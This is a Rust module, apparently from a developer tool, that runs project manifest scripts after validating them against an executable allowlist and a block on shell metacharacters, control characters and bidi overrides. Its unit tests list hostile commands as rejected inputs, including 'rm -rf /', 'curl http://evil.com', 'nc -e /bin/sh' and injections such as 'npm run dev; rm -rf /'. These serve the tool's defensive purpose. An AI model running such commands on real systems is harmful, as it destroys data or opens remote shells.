use serde::Serialize;
use std::process::Command;

use crate::core::error::NexenvError;
use crate::core::manifest;

#[derive(Debug, Serialize, Clone)]
#[serde(rename_all = "camelCase")]
pub struct ScriptResult {
    pub script: String,
    pub command: String,
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
}

pub fn list_scripts(project_path: &str) -> Result<Vec<(String, String)>, NexenvError> {
    let m = manifest::load_manifest(project_path)?;
    match m {
        Some(manifest) => {
            let mut scripts: Vec<(String, String)> = manifest.commands.into_iter().collect();
            scripts.sort_by(|a, b| a.0.cmp(&b.0));
            Ok(scripts)
        }
        None => Ok(Vec::new()),
    }
}

pub fn run_script(project_path: &str, script_name: &str) -> Result<ScriptResult, NexenvError> {
    let m = manifest::load_manifest(project_path)?
        .ok_or_else(|| NexenvError::InvalidConfig("No hay manifest".to_string()))?;

    let command = m.commands.get(script_name).ok_or_else(|| {
        NexenvError::InvalidConfig(format!("Script no encontrado: {}", script_name))
    })?;

    validate_script_command(command)?;

    let (shell, flag) = if cfg!(windows) {
        ("cmd", "/C")
    } else {
        ("sh", "-c")
    };

    let output = Command::new(shell)
        .args([flag, command])
        .current_dir(project_path)
        .output()?;

    Ok(ScriptResult {
        script: script_name.to_string(),
        command: command.clone(),
        exit_code: output.status.code().unwrap_or(-1),
        stdout: String::from_utf8_lossy(&output.stdout).to_string(),
        stderr: String::from_utf8_lossy(&output.stderr).to_string(),
    })
}

/// Ejecutables permitidos como primer token de un comando de manifest.
/// Solo herramientas de desarrollo estándar — no shells genéricos ni utilidades del sistema.
const ALLOWED_EXECUTABLES: &[&str] = &[
    // Node.js ecosystem
    "npm", "npx", "yarn", "pnpm", "bun", "bunx", "node", "tsc", "tsx",
    "vitest", "jest", "eslint", "prettier", "biome", "next", "nuxt", "vite",
    // Python ecosystem
    "python", "python3", "pip", "pip3", "uv", "uvicorn", "gunicorn",
    "pytest", "ruff", "black", "mypy", "flask", "django-admin",
    "poetry", "pipenv",
    // Rust ecosystem
    "cargo", "rustc", "rustfmt", "clippy-driver",
    // Go ecosystem
    "go", "gofmt",
    // Docker
    "docker", "docker-compose",
    // Build tools
    "make", "cmake",
    // Version managers
    "nvm", "fnm", "pyenv", "rustup",
    // Generic dev
    "echo", "cat", "ls", "pwd", "which", "true",
];

/// Shell metacaracteres que permiten encadenar comandos arbitrarios.
const DANGEROUS_CHARS: &[char] = &['|', '`', '$', '(', ')', ';', '&', '<', '>'];

/// Chars Unicode de formato bidireccional que permiten ofuscar comandos visualmente.
/// U+202A..U+202E (embeddings/overrides) y U+2066..U+2069 (isolates).
fn is_bidi_format_char(c: char) -> bool {
    matches!(c as u32, 0x202A..=0x202E | 0x2066..=0x2069)
}

fn validate_script_command(command: &str) -> Result<(), NexenvError> {
    if command.len() > 500 {
        return Err(NexenvError::InvalidConfig(
            "Comando demasiado largo (max 500 caracteres)".to_string(),
        ));
    }

    if command.trim().is_empty() {
        return Err(NexenvError::InvalidConfig(
            "Comando vacio".to_string(),
        ));
    }

    // Rechazar control chars (newline, tab, null, BEL, ESC, etc.) y bidi overrides.
    for ch in command.chars() {
        if ch.is_control() || is_bidi_format_char(ch) {
            return Err(NexenvError::InvalidConfig(format!(
                "Comando contiene caracter de control no permitido: {:?}",
                ch
            )));
        }
    }

    // Rechazar metacaracteres de shell que permiten inyección
    for ch in DANGEROUS_CHARS {
        if command.contains(*ch) {
            return Err(NexenvError::InvalidConfig(format!(
                "Comando contiene caracter no permitido: '{}'. Solo se permiten comandos simples sin pipes ni encadenamiento",
                ch
            )));
        }
    }

    // Extraer el primer token (ejecutable) y validar contra allowlist
    let executable = command.split_whitespace().next().unwrap_or("");
    let exe_lower = executable.to_lowercase();

    if !ALLOWED_EXECUTABLES.iter().any(|allowed| exe_lower == *allowed) {
        return Err(NexenvError::InvalidConfig(format!(
            "Ejecutable '{}' no esta en la lista de permitidos. Permitidos: {}",
            executable,
            ALLOWED_EXECUTABLES.join(", ")
        )));
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::core::manifest::{self, ProjectManifest};
    use std::collections::HashMap;

    #[test]
    fn test_list_scripts_no_manifest() {
        let dir = tempfile::tempdir().unwrap();
        let scripts = list_scripts(dir.path().to_str().unwrap()).unwrap();
        assert!(scripts.is_empty());
    }

    #[test]
    fn test_run_script_no_manifest() {
        let dir = tempfile::tempdir().unwrap();
        let result = run_script(dir.path().to_str().unwrap(), "dev");
        assert!(result.is_err());
    }

    #[test]
    fn test_list_scripts_with_manifest() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().to_str().unwrap();
        let mut commands = HashMap::new();
        commands.insert("dev".to_string(), "echo dev".to_string());
        commands.insert("test".to_string(), "echo test".to_string());
        let m = ProjectManifest {
            name: "test".to_string(),
            commands,
            ..Default::default()
        };
        manifest::save_manifest(path, &m).unwrap();

        let scripts = list_scripts(path).unwrap();
        assert_eq!(scripts.len(), 2);
    }

    #[test]
    fn test_run_script_echo() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().to_str().unwrap();
        let mut commands = HashMap::new();
        commands.insert("hello".to_string(), "echo hello_world".to_string());
        let m = ProjectManifest {
            name: "test".to_string(),
            commands,
            ..Default::default()
        };
        manifest::save_manifest(path, &m).unwrap();

        let result = run_script(path, "hello").unwrap();
        assert_eq!(result.exit_code, 0);
        assert!(result.stdout.contains("hello_world"));
    }

    #[test]
    fn test_run_script_not_found() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().to_str().unwrap();
        let m = ProjectManifest {
            name: "test".to_string(),
            commands: HashMap::new(),
            ..Default::default()
        };
        manifest::save_manifest(path, &m).unwrap();

        let result = run_script(path, "nonexistent");
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_script_command_safe() {
        assert!(validate_script_command("npm run dev").is_ok());
        assert!(validate_script_command("cargo test").is_ok());
        assert!(validate_script_command("pytest --cov").is_ok());
        assert!(validate_script_command("docker compose up -d").is_ok());
        assert!(validate_script_command("make build").is_ok());
        assert!(validate_script_command("echo hello").is_ok());
        assert!(validate_script_command("uvicorn app.main:app --reload").is_ok());
    }

    #[test]
    fn test_validate_script_command_blocked_executable() {
        assert!(validate_script_command("rm -rf /").is_err());
        assert!(validate_script_command("shutdown now").is_err());
        assert!(validate_script_command("dd if=/dev/zero").is_err());
        assert!(validate_script_command("curl http://evil.com").is_err());
        assert!(validate_script_command("wget http://evil.com").is_err());
        assert!(validate_script_command("bash -c 'evil'").is_err());
        assert!(validate_script_command("sh -c 'evil'").is_err());
        assert!(validate_script_command("nc -e /bin/sh").is_err());
    }

    #[test]
    fn test_validate_script_command_blocked_metacharacters() {
        assert!(validate_script_command("npm run dev | cat").is_err());
        assert!(validate_script_command("npm run dev; rm -rf /").is_err());
        assert!(validate_script_command("npm run dev && evil").is_err());
        assert!(validate_script_command("npm run $(evil)").is_err());
        assert!(validate_script_command("npm run `evil`").is_err());
        assert!(validate_script_command("npm run dev > /etc/passwd").is_err());
    }

    #[test]
    fn test_validate_script_command_too_long() {
        let long_cmd = "npm ".to_string() + &"a".repeat(500);
        assert!(validate_script_command(&long_cmd).is_err());
    }

    #[test]
    fn test_validate_script_command_empty() {
        assert!(validate_script_command("").is_err());
        assert!(validate_script_command("  ").is_err());
    }

    #[test]
    fn test_validate_script_command_rejects_control_chars() {
        assert!(validate_script_command("npm run dev\nrm -rf /").is_err());
        assert!(validate_script_command("npm run dev\r\nevil").is_err());
        assert!(validate_script_command("npm run\tdev").is_err());
        assert!(validate_script_command("npm run dev\0evil").is_err());
        assert!(validate_script_command("npm run dev\x07").is_err());
        assert!(validate_script_command("npm run dev\x1b[31m").is_err());
    }

    #[test]
    fn test_validate_script_command_rejects_bidi_override() {
        assert!(validate_script_command("npm run \u{202E}dev").is_err());
        assert!(validate_script_command("npm run \u{202D}dev").is_err());
        assert!(validate_script_command("npm run \u{2066}dev").is_err());
    }

    #[test]
    fn test_validate_script_command_blocks_env_printenv() {
        assert!(validate_script_command("env").is_err());
        assert!(validate_script_command("env FOO=bar").is_err());
        assert!(validate_script_command("printenv PATH").is_err());
    }
}
